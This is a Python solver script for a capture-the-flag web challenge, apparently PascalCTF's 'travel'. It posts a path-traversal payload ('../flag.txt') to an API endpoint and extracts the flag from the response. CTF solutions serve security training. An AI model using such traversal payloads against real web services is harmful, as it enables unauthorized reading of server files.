import requests, re

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(url: str, prefix: str) -> str:
    with requests.Session() as ses:
        headers = {
            "Content-Type": "application/json"
        }
        index_data = {
            "index": "../flag.txt"
        }
        flag = get_flag(ses.post(f"{url}/api/get_json", headers = headers, json = index_data).text, prefix)
    return flag

if __name__ == "__main__":
    url = f"https://travel.ctf.pascalctf.it"
    prefix = "pascalCTF"
    print(solution(url, prefix))
    